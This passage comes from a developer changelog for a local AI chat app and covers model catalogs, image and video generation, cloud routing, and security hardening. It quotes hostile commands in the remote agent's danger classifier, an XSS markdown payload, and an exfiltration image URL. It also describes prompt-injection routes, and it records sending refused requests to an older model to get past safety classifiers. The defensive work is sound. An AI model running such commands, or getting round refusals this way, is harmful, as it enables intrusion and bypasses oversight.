- THE BOX. One durable `[[dl:{...}]]` token, stashed as a placeholder the
  instant renderMD escapes the text so no inline rule can chew it, and
  stripped from the clipboard and the voice. Desktop click reveals in
  Finder; a browser over the tunnel gets the plain anchor.
- The wheels (69 MB, all pure) install on demand, and ride the build's
  optional pip line with `|| true`.
- Working line moves to 6.1.0. Gauntlet 165/165, with functional checks
  that run the real router and the real engines.

## 6b297 — the image box is a line, not a paragraph (uncut)

Per Patrick ("we don't need this whole sloppy description in here…
italics, installed with a checkmark, and a way to remove it, like an
uninstall feature"). Installed now reads `Image generation` with an
italic `installed ✓ · 10.9 GB` beside it and a Remove button; the
description only appears when it is NOT installed, which is the only
time it needs explaining. Remove takes both halves — the engine's own
venv and the weights — clears the job entry so the box reads as a
fresh install afterwards, and uses the two-step inline confirm the
roster already uses ("really remove? frees 10.9 GB"). New
`_dir_bytes_real()` does not follow symlinks: the hub cache keeps one
copy in blobs/ and links to it from snapshots/, so the old measure
reported a 9 GB model as 18 and would have promised twice the disk an
uninstall could actually free.

## 6b299-6b301 — video generation, a size ladder, and intent that reads the room (uncut)

Per Patrick, across several notes in one sitting.

- VIDEO alongside image. Both are now "studios": an optional generator
  with its own venv and a LADDER of models. Video runs Wan2.2 TI2V-5B via
  mlx-video locally, falls back to Veo through the Gemini key the user
  already has (predictLongRunning: submit, poll, fetch), and renders
  inline with a Range-serving /api/video route so WKWebView can scrub.
  The wizard offers both; Manage models removes either, and Remove takes
  the venv AND every ladder rung that was downloaded.
- THE LADDER. Notches, one per model, colour-coded against THIS machine's
  memory: green under half of RAM, amber under 80%, red above — and red
  refuses the click rather than pretending. A legend under it says what
  each colour means. Built by hand rather than as <input type=range> so
  each notch owns its colour.
- NO ENGINE NAMES. "A cookie — FLUX.1 schnell, on this Mac" became
  "A cookie — made on this Mac", and the name above every answer is gone.
  The user is using ConcordeAI, not a pile of engines we assembled.
- FETCH OR PAINT. "a picture of a cookie from the Internet" searches;
  "create me a picture of a cookie" paints. An explicit make-verb always
  commissions; "show me"/"find me"/"from the web" always looks.
- REFINEMENTS. "make the piano white" after a piano used to earn "I
  cannot generate or modify images". The default is flipped: right after
  a picture, a short message that is not a question and not a fresh
  commission refines it. Detection is deterministic; the new prompt is
  written by a RESIDENT model (never a cold load) with string surgery as
  the floor. Verified live: "make the piano white" returns a white piano
  with the room intact.
- THE ESTIMATE. /api/setup is polled by four tickers at once, and the old
  speed sample was mutated by every one of them — two calls 0.4s apart
  see the same byte count, so the rate read zero and the ETA climbed
  forever. Replaced with a rolling 60s window sampled at most every 2s,
  and no time is quoted until there is a real measurement.

## 6b302 — video generation, measured (uncut)

The local path is proven, not assumed: Wan2.2 TI2V-5B q8 (18 GB on
disk) through mlx-video, driven by the app's own install route. A red
balloon over a city at sunset came back correct at 49 frames /
704x480 / 20 steps in 6m10s.

Timings measured on an M4 Pro, and they set the ladder:
- 49f 704x480 20 steps -> 6m10s
- 33f 640x384 15 steps -> 2m29s, but WASHED OUT — 15 steps is below
  the floor where it still looks photographic
- 33f 640x384 20 steps -> 3m07s, and it looks right

So the rung now decides the RENDER, not just the download: Quick is
33 frames at 640x384, Accurate 49 at 704x480, Finest 65 at 832x480.
Steps stay at 20 or above everywhere.

Also fixed: two rungs share a repo (they differ only in frames and
size), and studio_bytes counted it twice — Remove was promising 40.2 GB
of a 19.2 GB install. Repos are deduped in both the size and the sweep.

## 6b303 — a gear per studio, and one-shot quality in chat (uncut)

Per Patrick ("a gear icon into the corner of each that opens a pop-up
giving options like resolution, frame rate, effort … then also allow in
the query the user to say things to describe the sort of quality they
want … while still leaving their default settings the same").

THREE LAYERS, innermost wins: the rung's defaults, the user's saved
settings, then a one-shot override parsed from the message. Only the
last is forgotten afterwards.

TWO CONTROLS ARE ABSENT ON PURPOSE, both confirmed by running the
engine rather than reading docs: mflux warns at runtime that
`--negative-prompt` is "ignored; FLUX.1 uses distilled guidance and has
no negative branch", and it parses `--lora-style` without ever reading
it (that flag belongs to a different entry point). A control that does
nothing is worse than no control. Video keeps its negative prompt,
where it is real.

ENGINE FACTS, read from the model's own config.json rather than
hardcoded: Wan aligns to patch_size[1] x vae_stride[1] = 32 (not 16,
which is the image figure), caps area at 901,120 px, renders at 24 fps
natively, and ASSERTS num_frames == 4n+1 — an unsnapped value is a
crash, not a rounded render. `_fit_area` mirrors both of the engine's
branches and then steps DOWN the grid, because rounding to the nearest
step can land above the cap and the engine would rewrite it behind us.

OVERRIDES are deterministic, never a model: an override is a number
handed to a renderer, and a model reading "double it" as 4096 costs
twenty minutes. Matched phrases are REMOVED from the text before the
prompt rewrite sees them, so "make the piano white and double the
resolution" splits cleanly. Bare "4k", "1080p", "portrait", "faster",
"gif" only count on a FOLLOW-UP — they are ordinary subject words, and
stripping them from a fresh commission would eat the subject.

Each render writes a sidecar beside its file recording what it actually
used, so "double the resolution" resolves against real numbers days
later. Verified: a 512x512 jpg, then "double the resolution" produced
exactly 1024x1024.

Also: /api/video widened to gif and webm, and the renderer emits <img>
rather than <video> for them, since a GIF in a video tag decodes to
nothing. Prefs writes now take a lock — generations write prefs too.

## 6b304 — the leak hunt (uncut)

Per Patrick ("a ~30 min bug hunting and performance leak finding
pass"). Six lenses in parallel, each attacked by a verifier that
re-measured: 47 findings reported, all 47 confirmed, about 20 distinct.
The high-severity ones are fixed; each has a gauntlet regression check.

- THE THIN LIST CRASH: a missing `+` since 6b281 made a string literal
  get CALLED, so every venue-hours question raised TypeError before the
  headers. It was the SyntaxWarning flagged at the 6.0.2 cut. The
  gauntlet now compiles with SyntaxWarning as an error.
- /api/setup 2.3s -> 0.025s median: no `python -c "import mlx_video"`
  twice per call, no 58k-file venv walk per call, each studio computed
  once, a disk-free /api/setup/busy for the idle strip, and in-flight
  guards on the tickers. RSS 424 -> 108 MB.
- cloud.json lost API keys under concurrent writers (71/500 rounds
  reproduced). Now lock + flock + atomic replace, and never persist over
  an unreadable file: 0/500.
- Timed .ics exports crashed on the (tz, place) tuple.
- Routing: settings-only follow-ups, back-references ("make the video
  longer", "make it a gif") and English words that are format aliases
  ("a word for tired") all route correctly now.
- 15 GB of abandoned *.incomplete downloads are swept safely.
- No pre-warm for chats that never use a text model; the warm-up stamps
  the idle clock so the janitor can free it.
- Renders run one at a time in their own process group and stop when
  the reader hangs up.
- prefs saves use unique temp files; size keeps its aspect ratio; mp4
  playback rate actually re-times the clip.

Deferred (lower severity): no retention sweep for generated images and
videos; Veo abandons a paid render on one transient error; run_model
retries can orphan an engine handle; the janitor can stop an engine
mid-answer; a few client polls that never stop after an error;
/api/video suffix ranges; /api/stats shells out three times per poll.

## 6b305 — the catalog brought up to September 2026 (uncut)

Per Patrick ("are they currently optimal for what's current and
deprecating any that are outdated or superseded?"). Seven research
agents, one per slot, each proposal attacked by an independent
verifier that fetched the repo, confirmed its size, and matched every
weight key against the INSTALLED mlx-lm 0.31.3 — so a newer model that
the app's engine cannot load was never an upgrade. Five proposals were
vetoed and are not here.

ADDED: Ministral 3 14B, Qwen 3.5 9B, Hermes 4 14B, Qwen 3.8 27B,
DeepSeek R1 8B (the 0528 Qwen3-8B distill), Qwen 3.5 Vision 9B (via
Ollama qwen3.5:9b), GLM 5.3, DeepSeek V3.2 671B.

REMOVED (moved to RETIRED_MODELS with their vetted identities, so
auto-clean can delete their weights): Mistral Nemo 12B, Phi-4 14B,
Qwen 2.5 Coder 7B and 14B, Qwen 3.6 27B, DeepSeek R1 7B, DeepSeek R1
671B, LLaVA Vision 7B, Llama 3.3 70B, Llama 4 Scout, Qwen 3 235B MoE,
GLM-5.2.

KEPT: Llama 3.2 1B and 3B (the verifier vetoed both small swaps —
Qwen 3.5 2B scores lower on instruction following, the job those rows
exist for, and LFM 2.5 has no Ollama tag and a revenue-capped licence),
Hermes 3 8B (Intel still needs an Ollama Hermes), Gemma 4 12B and 26B,
GPT-OSS 20B and 120B, Qwen 3.6 35B MoE.

The two dedicated coders go: two Qwen generations later, the general
models beat them at code (Qwen 3.8 27B on 24 GB+, Qwen 3.5 9B below
that), so the Code-lane picks point there. Every tier and agent pick
list was remapped by name and re-checked: no pick names a row that does
not exist. Vision still routes through Ollama — the MLX vision path was
vetoed because mlx-vlm is not installed.

NOT DONE, and why:
- Qwen 4 was announced on 2026-09-22 at Apsara, four tiers, still in
  training; no weights exist. Qwen 3.8 Flash Next (Aug 24), billed as
  the Qwen 4 architecture preview, uses model_type qwen4_exp, which
  mlx-lm 0.31.3 cannot load, and is 111 GB at 4-bit.
- The image ladder (FLUX.2 klein 4B, Z-Image Turbo q4/q8) is verified to
  resolve on the installed mflux, but each uses a different generator
  command than FLUX.1, and shipping it unrendered is how the mflux flag
  change bit us before. Deferred until a real render.
- FastWan2.2 (3-step video) loads but does not sample correctly on the
  installed mlx-video. Vetoed.

## 6b306 — Update models, and auto-clean on by default (uncut)

Per Patrick: "make sure that's enabled by default and trigger it so
that every time an update to our app lands and is installed, that it
will force the auto clean to run on startup … keep users current on
their models while also not forcing them to sit there and wait for a 20
gigabyte download." He picked mockup C of four ("names on demand"),
plus a Continue in background button that hands the progress to the
strip, and "make sure that any outdated models are cleaned out and not
just left in there taking up tons of space."

WHAT RUNS BY ITSELF. Auto-clean is on unless the user switched it off
(an explicit off is respected). The first launch of the real app after
an update sweeps at once (`_post_update_cleanup`); the janitor's first
tick a minute in and every six hours after repeat it. It removes every
RETIRED model on disk that this app downloaded, and never downloads
anything. A retired model the app can no longer use goes even when its
replacement isn't installed yet; the replacement is remembered as an
offer (`model_offers` in prefs) until it is taken.

WHAT IT NEVER TOUCHES. (1) Current catalog rows. The old rule read a
newer generation in the same family as a replacement, so Qwen 3.8 27B
"superseded" the Qwen 3.6 35B MoE and Hermes 4 "superseded" Hermes 3:
with the switch on by default it would have deleted both. The catalog
is curated, so only RETIRED_MODELS are ever outdated. (2) Models this
app didn't download. An Ollama tag or HF cache pulled for another tool
looks identical on disk, so the unattended pass only deletes labels in
the `app_models` ledger. An install that predates the ledger vouches
for every model it knows; a brand-new install starts empty and records
each download as it lands. Dev instances never seed it.

UPDATE MODELS. RETIRED_SUCCESSORS names each retired model's
replacements, best first. The first that fits this machine's memory is
what downloads (Qwen 2.5 Coder 14B gets Qwen 3.8 27B on a big Mac, Qwen
3.5 9B on a small one). Replacements go through the ordinary installer,
so the strip shows them; each old model is deleted only once its
replacement is complete on disk, and one whose replacement failed is
kept. One run at a time (`_modup`), its own speed window.

THE CARD. The post-update card waits for the startup sweep, then shows
one line ("Newer versions of 3 of your models are ready · 31 GB to
download · frees 20 GB"), names behind Show which, and Update models /
Later. Running: one bar, %, GB, speed, time left, and Continue in
background. The strip at the top left then reads "updating · 48%" and
clicking it reopens the card, not the installer. The Manage pane's row
is a switch ("Remove outdated models automatically") with one status
line and a button only when there's something to do; that button opens
the same section in its own card.

FOUND ON THE WAY. (1) The strip's label outgrew the sidebar once it
carried speed and time left, and squeezed the bar to 0px, so no bar
showed during downloads. The bar now sits above a two-part label, and
the time left is never clipped. (2) The "More models available" card
(its Download installs the whole max plan) fired right after the
post-update card. The catalog update adds eight models, so every user
would have met both. It now stands down on the update launch, keeping
its own promise of one card per launch. (3) The Models pane's "Model
updates…" button opened the installer; it now says "Add models…", and
the command palette has both.

## 6b307 — the most capable cloud model in every role, and the giants behind two boxes (uncut)

Per Patrick ("for claude api, which model does it use? are all our cloud
ones using the most capable models?"). A 20-agent workflow (a researcher
per provider, two adversarial verifiers each, a code audit) and then
every setting sent to the live APIs with his keys before it went in.

WHAT EACH ROLE USES NOW (his inventories, 2026-09-22):
- Claude: Opus 5.5 for the council seat (effort medium) and the final
  answer (effort high); Haiku 4.5 on the Fast tier (no effort: Haiku
  400s on it, verified). Was Sonnet 5 everywhere. Patrick chose Opus 5.5
  over Fable 5.1, which trails it on every published benchmark at 2.5x
  the price.
- Gemini: 3.8 Flash for seat and final answer (medium effort: "high"
  took 70s to say one word and drew 503s), 3.5 Flash-Lite on Fast. Was
  3-flash-preview, and the final answer swapped to gemini-2.5-pro.
- Groq: Qwen 3.8 27B for the seat, gpt-oss-120b as the second seat, the
  final-answer rung and the Fast tier (low effort). His free tier gives
  Qwen ~1,000 output tokens a minute, enforced on a rolling estimate,
  so on that key gpt-oss does most of the work.
- Kimi: K3, unchanged. His Moonshot account is suspended for
  insufficient balance; the app now says "out of credit" and rests it
  an hour instead of calling it a rate limit every ten minutes.

HOW. Picks are RANKED by parsed version (cloud_candidates), not matched
by substring, so a newer model is picked the day it appears. The whole
chat inventory is stored (six ids hid Haiku and every Gemini 3.x), and
Anthropic's list is read with limit=1000. Each call carries a role;
_anthropic_body/_openai_body send the effort that role gets, verified
live per provider, with output ceilings raised from 4096 (thinking
models spent it all thinking and came back empty).

FAILURES. A throttle, overload or bad request now rests the MODEL and
the provider's next ranked model stands in (cloud_role_model); only a
provider-wide quota benches the provider. A model is retired only on a
404 or a 400 that says it is gone, for a day. Found live: Patrick's
Groq pick, gpt-oss-120b, had sat on the dead list for a month under the
old any-400-is-forever rule, so Groq took no council seat and no Fast
answer. Unstamped entries get another chance.

ALSO. gemini-2.5-flash-image left the image ladder (shuts down
2026-10-02). Veo tries the next model only when a submit fails; a
render that started is the only try. Save-time defaults moved off
retiring ids. Refusals (Opus 5.5 safety classifiers) hand over to the
next rung without resting Claude.

THE GIANTS, per Patrick ("anything that requires more than 128 gigs of
memory to run is probably pointless"): GLM 5.3 (430 GB) and DeepSeek
V3.2 (390 GB) stay in the catalog so auto-clean never deletes a
download someone chose, but every list hides them unless both "ignore
system limits" and the new "Include 128 GB+ models" box (greyed until
the first is ticked, with an i tooltip about 512 GB) are on. "Max" on a
48 GB Mac drops from 926 GB to 130 GB. The Titan group holds only them.

REVIEWED before it shipped: five reviewers (request bodies, failure
states, ranking, giants/UI, regressions), every finding put to a
skeptic; 31 confirmed, 19 distinct, all fixed. The ones that mattered:
a refusal after text had streamed shipped the partial as the answer
(now wiped with RESET and handed to the next rung); Cloud Only told a
user with a working key to "add a key" once model-level rests hid the
provider (cloud_rest_left now feeds that message and Settings); a busy
or throttled top pick at key save marked a good key failed; Google's
400 for a revoked key read as a bad request; "no limits" was silently
off after EVERY restart (the import-time read failed before load_prefs
existed and the failure was cached; the giants box inherited it); an
installed giant still ran in tiers with the gate closed; Groq's final
answer went to Qwen, which the free tier turns away (gpt-oss now); the
effort parameter was sent to Sonnet 4.5, which 400s on it (effort now
only on Opus 4.5+, Sonnet 4.6+ and Fable, each probed live).

## 6b308 — the ideal model per task, and leftovers from failed downloads (uncut)

Per Patrick ("selecting the ideal model for different tasks … especially
if we can keep it up to date as the models get cycled in and cycled
out", and "make sure that the auto clean feature removes leftovers from
downloads that never finish"). A 16-agent workflow mapped every cloud
call in the app to the model it really got, designed per task, and had
each design challenged; Patrick decided the cost calls.

ROLES (cloud_candidates), each ranked by parsed version with a FLOOR
per line, so an older line drops out and a newer model is fielded the
day it appears (no model id is named anywhere in the picking):
- fast: Haiku, then Sonnet 5.x · Flash-Lite · gpt-oss (low effort)
- utility: the same, never Kimi (titles, memory, map pins, funnel Fast)
- code: Sonnet 5.x first (medium) — the Code tab, Patrick's pick
- work: Opus 5.x (medium) — writing, resumes, exports, funnel verdict
  and Normal stages, the remote agent
- seat: Opus 5.x (medium), Gemini Flash 3.6+, Groq Qwen + gpt-oss
- composite: Opus 5.x (high) — every final answer
Floors: Claude 5.x (Haiku for quick), Gemini Flash 3.6+ (Lite any),
Groq gpt-oss outside the seat. When a key reaches nothing above the
floor, the floor gives way.

LADDERS: fast = Claude, Groq, Gemini (a tunnel guest gets Groq, Gemini,
Claude, so a visitor never lands on the owner's Anthropic bill);
work/code = Claude, Groq, Gemini, Kimi; composite unchanged. Kimi stays
off the quick ladders (KIMI_TESTED) until its effort values can be
sent live — the account is suspended.

REFUSALS: Opus 5.x runs classifiers that can decline firewall/SSH/VPN
work. claude_refusal_conf gives one more try on the newest Opus of the
previous generation (a rule, not a name), in the fast/work path, the
council's final answer, Cloud Only, the funnel audit and the remote
agent (no backoff sleep).

NEW CLOUD JOBS (Patrick, all three): pasted images go to the vision
ladder when cloud power is on (Haiku on Fast, Opus on Thinking/Pro/
Cloud Only, Gemini Flash beside it; local vision model is the floor —
Cloud Only reads images now). Titles, memory and map pins use the
quick model of THE PROVIDER THAT WROTE THE ANSWER (_answered, marked on
the request thread), quietly, so no second company sees the chat and a
chat answered on this Mac never leaves it.

FUNNELS: a Fast / Normal effort pair in the sidebar (Fast: Haiku, 1-2 s
a stage; Normal: Opus 5.5 medium); a stage that fails the gate is redone
on the work model either way; the audit stays Opus high. /api/funnel is
owner-only now (a tunnel guest could spend the keys). The remote agent
follows the cloud-power switch.

LEFTOVERS (_sweep_leftovers), at launch, every six hours, after every
cleanup and every Update models run, whatever the auto-clean switch
says: incomplete HF folders of retired models (after 30 min idle) and of
current ones (after a day idle, in case the download resumes); studio
model folders with no weights at all; a studio engine whose install
failed (marked by the installer, removed after a day); Ollama
*-partial* chunks untouched for a day; this app's own crash temp files;
and copies of the key file left by test instances on ports nothing
serves. Nothing written recently is touched, and nothing not this app's
own. Found on Patrick's Mac: three retired models' metadata-only folders
and four plaintext key-file copies.

ALSO: council drafts that run past the council's own deadline no longer
rest Opus 5.5 (it took the final answer away); a hurried merge reaches
the cloud only with cloud power on; the image key rides in a header;
standard Veo ($3.20 a clip) is no longer a silent fallback.

REVIEWED (five lenses, a skeptic per finding): 17 confirmed, 12
distinct, all fixed. Tunnel guests reached the owner's Anthropic key
first on the Code tab, exports and the hurried merge (the guest order now
rides every ladder). A chat answered on this Mac could be titled in the
cloud by the previous chat's provider (the record is now cleared when a
question starts). The sweep could delete a COMPLETE retired model with a
stale carcass beside it (carcasses of retired repos go first now). Quiet
background calls could still bench a provider for an hour on a title
that mentioned billing. A picture Claude read was badged "this Mac" (a
"w": "cloud" marker at the end of the answer fixes the badge). Also:
Cloud Only + picture never starts a local download and says when the
vision providers are resting; the owner through the tunnel can run
funnels; the remote agent says "turn on cloud power" when that's the
only thing missing; a studio venv is marked from the start of its
install, so a sibling's sweep can't take it mid-pip; Ollama partials are
judged per download by their newest file.

HEADER CHIPS (Patrick, from a screenshot): the MODELS AVAILABLE chip was
263 px wide in a 300 px sidebar starting at x=89, and squeezed the
wordmark to zero width. Its `flex:1 0 100%` was written for a two-row
header. It and the web DOWNLOAD NOW chip now sit on their own line
under the header; verified inside the sidebar at 300, 240 and 200 px.

## 6b309 — the harness fixes: the Remote agent's gate, guest renders, a nightly check (uncut)

Per Patrick ("where appropriate, do we have agents and harnesses in
place", then "do both"). An eight-agent audit rated every agent and
pipeline; these are its five small, first fixes.

THE REMOTE AGENT'S GATE. classify_cmd decides what runs without asking.
Fed real commands, it let Auto mode take a network interface down,
delete the default route, or rewrite sshd_config behind a 2>/dev/null,
and let Full mode run rm -rf --no-preserve-root /; it flagged reading
/etc/passwd as dangerous. Now: rm with long flags, the lockout commands
(interface/route/address down, flush, delete) and curl|sh are danger;
sed -i, find -delete/-exec, curl/wget that write files, journalctl
vacuum and git config with a value are writes; ip, ifconfig, wget, git
config and hostname are judged by their subcommand; discarding output
no longer switches off the redirect check; the power verbs and passwd
count only as the command itself. 66 real commands are pinned in the
gauntlet, including the everyday reads that must not start asking.

AUTONOMY FAILS CLOSED, AND SILENCE IS NOT CONSENT. Any level other than
manual/auto/full now means manual (it used to mean Full). An approval
nobody answers in 10 minutes pauses the run ("nothing ran; say keep
going") instead of being told to the model as a decline; only an
explicit yes runs a batch or a reboot ("expired" is a truthy word, so
the reboot path checks it first).

OUTPUT IS DATA. What the server prints goes back to the model fenced in
<command_output>, with REMOTE_SYSTEM saying it is never an instruction,
and with private keys, password hashes and token-like values redacted
before any model sees it. The Remote, Coding, Workspace and Research
lanes no longer auto-search the web (/search still does): snippets were
landing in a root shell's task.

GUEST RENDERS. A tunnel guest (not the owner's uid) gets no video (a
cloud clip is ~$0.80 on the owner's key; a local one holds the only
render slot for up to an hour) and no Gemini-made pictures. The owner's
cloud video stops at 5 clips a day (pref veo_daily_cap).

THE NIGHTLY CHECKS ITSELF. ci_smoke.sh compiles with SyntaxWarning as an
error, boots the app headless in an empty home with no models or keys,
and requires the page (no unreplaced __TOKENS__) and /api/stats. Proven
locally to fail on a syntax warning, an import crash and an unreplaced
token. nightly.yml runs it before building anything.

turbo.sh is deleted: it wrote cloud.json whole and erased every other
provider's key.

REVIEWED (five lenses, a skeptic per finding): 22 confirmed. The one
that mattered most was mine: counting the power verbs and passwd only
in command position (to stop reading /etc/passwd from asking) let
/sbin/reboot, sudo -u root reboot, systemctl --no-block reboot, a
scheduled reboot, $(reboot) and awk system("reboot") through. The
classifier now FAILS CLOSED: those words anywhere make a command
dangerous unless only a plain reader (cat, grep, getent, journalctl…)
touches them with no substitution and no pipe into a shell. Also fixed:
a lone & and $( )/backticks/<( ) hid a second command; bash's >&file
went unseen (a disk wipe read as "read"); quoted targets, rsync
--delete /, find / -delete and writes to passwd/shadow/sudoers/fstab
were only writes; iproute2's short forms (ip l s eth0 down) and nmcli/
networking stops escaped the lockout rules; curl -f read as -F. 137
commands pinned. Redaction now runs before output is cut (a key cut in
half slipped past), catches quoted JSON keys, never crosses a line or
hides a path; the fence carries a per-call id. /search can't feed the
Remote agent. Approval cards are drawn once, show "expired — nothing
ran" when the server says so, and retire unanswered when the run ends.
The Veo slot is reserved before the paid submit and handed back only
when no render started. ci_smoke.sh picks a free port, fails on a
traceback and kills the app's children.

ALSO FOUND (6b309): 6b306 defined _ledger_add(label) for the downloaded-
models ledger, a second top-level _ledger_add after the Contribute GPU
ledger's _ledger_add(seconds, chars, jobs). Python keeps the last, so
since the 6.1 nightly every contributed job raised after submitting its
answer, then submitted an error for the same job, and the contribution
stats stopped. Mine are now _app_models / _app_models_add /
_app_models_seed, and the gauntlet fails on any top-level function
defined twice.

THE WEB VERSION IS OFF (2026-09-24, per Patrick: "we don't really need
that one anymore because I'd rather people download the app"). The
hosted copy (net.millertechnology.millenai, ~/Library/MillenAI-live on
:9889) served ai.millertechnology.net through the cloudflared tunnel and
ran on the owner's own cloud.json, so any visitor with a guest pass was
spending his keys. Stopped and disabled with its hourly updater; the
tunnel, which also carried trucking.millertechnology.net (a static joke
site, also retired), is stopped and disabled. The service files are in
~/Library/LaunchAgents/disabled/ and ~/.cloudflared/config.yml has a
dated backup, so all of it can come back. A scan of every commit of the
public concordeai, concorde-site and the private concorde-vpn repos found
none of the owner's keys and no key-shaped strings; builds ship only
millenai.py, fonts, icons, vfx and a launcher.

CONTRIBUTE LENDS THIS MAC'S GPU AND NOTHING ELSE (6b309, per Patrick:
"make sure that if any user is contributing GPU, that they're only
contributing their own GPU, not their cloud models that they're paying
for"). It already couldn't reach a cloud: run_model knows only the MLX
and Ollama engines on 127.0.0.1, and no catalog tag is an Ollama "-cloud"
tag (those run on ollama.com and bill the user's Ollama account). But
the worker ran whatever label the hub sent, and an unknown one fell
through to run_model's pick-any-local-model fallback. Now it runs only a
model it advertised that same lap and sends the hub an error for
anything else. The gauntlet walks every function _contrib_loop can reach
and fails on any cloud name or any URL that isn't 127.0.0.1; mutation-
tested against a cloud fallback in run_model, a remote Ollama URL, a
cloud tag in the catalog, a cloud_conf() read, and the guard removed or
moved.

Also: the advertised-models list called model_cached on every catalog
label, which raises for a label with no engine on the machine (Hermes 4
14B, GLM 5.3 and DeepSeek V3.2 are MLX-only), so on Intel and Windows
every lap ended "hub offline — retrying" and Contribute never worked
there. The ledger write moved out of the try, so a ledger that can't be
written no longer turns an answered job into an error for the same job.

NOTE: FLEET_HOME, Contribute's default hub, is ai.millertechnology.net —
the web version switched off today. Contributors now have no hub.

## 6b310 — nobody's chats reach another user
Per Patrick: "The absolute most important thing is that we prevent
people's questions, answers, and chats from mixing with other users."
A design review for accounts and sync (on hold, not in this build) found
four ways they already could, in today's app. All four are closed here,
without waiting for accounts.

- ANOTHER LOGIN'S APP COULD SERVE YOUR WINDOW. The server bound on a
  background thread and the window opened 127.0.0.1:8889 whatever
  happened. On a Mac with two logins both running ConcordeAI, the
  second person's window loaded the FIRST person's app: their chats,
  memory and keys. Now bind_backend binds before any window, a taken
  8889 moves the desktop app to 8941-8949 (clear of the engines, 9889
  and ConcordeGo's 9897), and a dev or test instance that named its
  port fails instead of drifting. One desktop app per OS user
  (run/instance.lock): a second copy on a fallback port would have
  written the same chats.json. Windows binds with SO_EXCLUSIVEADDRUSE,
  because its SO_REUSEADDR lets a second process bind a listening port.
- ANYTHING ON THE COMPUTER COULD READ /api/chats. The web version's
  door had been switched off (_gate returned True), and loopback is
  shared by every account. Each launch now mints a key; the window
  collects it once through /?key= as an HttpOnly, SameSite=Strict
  cookie named for the port (browsers share cookies across the ports
  of one host), and every request needs it plus a Host of this
  server's own loopback name, which also stops DNS rebinding.
  MILLENAI_KEY still pins it for dev and test instances; the gauntlet,
  ci_smoke.sh, drill.py and CLAUDE.md send millen_key_<port>.
- ANOTHER ACCOUNT'S ENGINE GOT YOUR PROMPTS. Anything listening on
  11434 counted as Ollama, and anything on an MLX catalog port counted
  as that engine. Two logins running ConcordeAI share those fixed
  ports, so the second person's prompts, memory, name and attached files
  went to the first person's engines. _listener_is_mine now wants the
  listener's owner to be this user or a system account (root, Linux's
  "ollama" service user: only the administrator controls those).
  macOS: netstat -anv names every socket's pid and ps its uid, but
  MEASURED, netstat shows no TCP sockets at all when a non-Apple
  Python runs it (the app's venv included), so in practice it falls
  back to lsof, which lists only the user's own processes: a root
  Ollama reads as unknown and ours runs privately instead. Linux:
  /proc/net/tcp's uid column. Windows: psutil, else netstat and
  tasklist. Someone else's listener moves ours to a free port:
  MODEL_ROUTES for MLX, OLLAMA_PORT plus OLLAMA_HOST for Ollama,
  including the `ollama rm` fallback, which defaulted to 11434 too.
  If ours can't start, ollama_url raises instead of sending.
- POLLINATIONS IS GONE (per Patrick: remove it). With cloud power on and
  no key, whole prompts went to text.pollinations.ai, memory and name
  included. With no local image model and no Gemini key, image
  descriptions went to image.pollinations.ai in the URL with no
  opt-in, never with its private flag, onto a public feed. The Cloud
  power pane said prompts leave "only while a key is on"; it now says
  what is true, web searches included.
- AN ANSWER COULD RUN SCRIPT IN THE PAGE. esc() escaped & < > but not
  quotes, and renderMD builds <img alt="…"> and <a href="…"> from the
  markdown, so ![x" onerror="…](https://…) closed the attribute and
  ran code that could read every chat. A web page can talk a model
  into writing exactly that line. esc() escapes both quotes now;
  hilite leaves entities whole so a lone apostrophe's &#39; isn't
  split by the number rule, and chat ids are escaped in the sidebar.
  The gauntlet runs the page's own renderMD in node over an
  attack corpus and fails on any on* attribute.
- Each new check was mutation-tested: old esc, a trusted-any-listener
  owner check, no fallback port, a Pollinations URL, and a hardcoded
  11434 URL each fail it.
- Also: the account droplet was rebooted onto its pending kernel
  (7.0.0-34), approved by Patrick; the web version's leftovers
  (users/ with 50 visitor profiles, google_oauth.json, owner_pin) went
  to the Trash on his OK.

### 6b310 review round: four reviewers, a skeptic per finding, 23 confirmed
- THE KEY COOKIE WENT TO EVERY LOCAL PORT. Browsers scope a 127.0.0.1
  cookie by host, not port, so one <img src="http://127.0.0.1:5555/">
  (a web page's og:image, or a model's markdown) handed the launch key
  to whatever listened there; confirmed in WKWebView and Chromium. The
  page now carries a CSP of self + https only (PAGE_CSP), so any
  plain-http load elsewhere is refused before it is sent (checked in
  the browser pane and in a real hidden WKWebView). Photos and funnel
  images are https-only on the server and in the page, and the gate
  accepts ANY millen_key_<port> value, so a stray cookie with a longer
  Path can't shadow the key.
- ANSWERS NO LONGER LOAD REMOTE PICTURES. ![](https://collector/?q=…)
  loaded with no click, so a web page could talk a model into sending
  the question out. Markdown images render only from /api/image/; a
  remote one becomes a link.
- MODEL TEXT CAN'T OPEN A STREAM FRAME. The server's own frames (RESET,
  RUN, DRAFT) are tagged Ctl(str); emit() strips NUL from everything
  else, status() too, so an answer or a remote command's output can't
  fake a MAP pin, SOURCES row, APPROVE card or a RESET.
- ENGINE OWNERSHIP IS THREE-STATE. True, False, or None when the probe
  failed; only a definite False moves an engine, None refuses the one
  request (a slow lsof under memory pressure used to spawn a second
  copy of a 17 GB model). One lsof lists all of this user's listeners
  for a second (_my_listen_ports), since the status screens ask about
  every model. run_model stops when the engine didn't start (its False
  was ignored and the prompt went to whatever held the port), re-checks
  ownership right before sending, and retires a stale engine instead of
  just forgetting its handle. "Loaded" means loaded here (_engine_up).
  Only this user's siblings keep engines alive at quit; moved engines
  and a private Ollama always stop; the boot reaper takes this user's
  mlx_lm orphans on any port and never the app itself. Windows compares
  full DOMAIN\user names.
- FALLBACK PORTS MOVED to 18890-18898: 8941-8949 held two engine ports
  (8942, 8944), and the gauntlet now fails on any overlap with catalog
  or retired ports.
- A SECOND LAUNCH HANDS OFF instead of quitting silently: the running
  copy writes run/instance.json (0600) once bound, and a second launch
  asks /api/window/focus to bring the window forward (browser mode
  reopens the tab WITH the key), exits at once, waits on the lock only
  when the first copy doesn't answer (the swap after an update), and
  says so in a native dialog if it runs out.
- THE BROWSER-STORAGE CHAT COPY NEVER GOES BACK TO DISK: it resurrected
  chats erased with Forget, and it is kept per port. Remote agent
  autonomy lives in prefs too, so a moved app can't loosen it.
- Smaller: mapCard takes numbers only; flow-diagram text isn't escaped
  twice; the download fallback clicks a real download link (a
  navigation made pywebview re-fetch without the cookie and save the
  403); "in the cloud" shows only when a cloud painter exists; the
  Cloud power copy says web search sends the question as typed.
- CONTRIBUTE IS GONE (per Patrick: "we don't need a feature where
  friends can answer each other's questions"). Three reviewers found it
  still reachable: a worker pointed at an older hub ran other people's
  questions, memory and names included. Worker, hub routes, fleet
  state, the Community pane, the sidebar meter, the invite, the setup
  checkbox and the friend's-GPU badge are all removed; the desktop app
